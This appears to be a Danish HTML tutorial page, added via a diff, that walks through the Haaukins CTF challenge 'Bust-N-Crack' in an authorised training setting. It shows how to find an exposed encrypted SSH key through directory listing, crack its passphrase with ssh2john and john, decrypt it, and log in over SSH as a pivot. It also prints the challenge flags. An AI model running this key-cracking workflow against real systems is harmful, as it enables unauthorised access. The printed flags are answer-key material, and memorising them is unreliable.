@@ -1,0 +1,42 @@
+<!doctype html>
+<html lang="da">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Haaukins: Bust-N-Crack — tutorial (Bust &amp; Crack)</title>
+<meta name="description" content="Guide til Haaukins Bust-N-Crack: find en glemt fil via Apache directory listing (Bust), knæk den krypterede SSH-nøgle med ssh2john, og brug den som pivot (Crack).">
+<link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+<div class="wrap">
+<nav class="topnav"><a href="index.html">← Alle Haaukins-tutorials</a></nav>
+<h1>Bust-N-Crack</h1>
+<p class="subtitle">Directory listing → en krypteret nøgle → ssh2john → pivot ind.</p>
+<div class="badges"><span class="badge cat">Web / Cracking</span><span class="badge">Haaukins CTF</span></div>
+<div class="callout">🎓 <strong>Prøv selv først.</strong> Trinene viser metoden; det konkrete flag ligger i en sammenklappelig spoiler nederst. Haaukins-flag er ofte per-instans, så det er <em>fremgangsmåden</em> der tæller.</div>
+
+<h2>Bust — directory listing</h2>
+<p>Apache directory listing er slået til; fuzzing finder <code>/privacy/</code> med
+             <code>flag.txt</code> + <code>key.txt</code> (en krypteret RSA-privatnøgle).</p>
+<h2>Crack — ssh2john + pivot</h2>
+<pre><code>ssh2john key.txt > key.hash
+john --format=SSH --wordlist=rockyou.txt key.hash     # -> ChangeMe
+openssl rsa -in key.txt -passin pass:ChangeMe -check   # bekræft
+# passphrasen er ikke flaget -> brug nøglen som pivot:
+openssl rsa -in key.txt -passin pass:ChangeMe -out dec_key
+ssh -i dec_key haxor@bustncrack.com ; cat /home/haxor/flag.txt</code></pre>
+<details class="spoiler"><summary>🚩 Vis løsning &amp; eksempel-flag</summary>
+<ul>
+        <li>Bust: <span class="flag">HKN{wnW-Sc-owaen}</span></li>
+        <li>Crack: <span class="flag">HKN{EEk-ndM-qt1o}</span> (per-instans)</li>
+        </ul>
+</details>
+<h2>Hvad du har lært</h2>
+<ul><li>Tjek altid for directory listing før du dirbuster enkeltfiler.</li><li><code>ssh2john</code> + <code>john --format=SSH</code> knækker krypterede PEM-nøgler.</li><li>Passphrasen er sjældent flaget — nøglen er et pivot-middel; bekræft og brug den.</li></ul>
+<footer>
+Del af <a href="index.html">Haaukins CTF-tutorials</a>. Materialet er løsningsstøtte til en autoriseret
+trænings-/CTF-kontekst — brug det til at lære, ikke til at springe læringen over.
+</footer>
+</div>
+</body>
+</html>
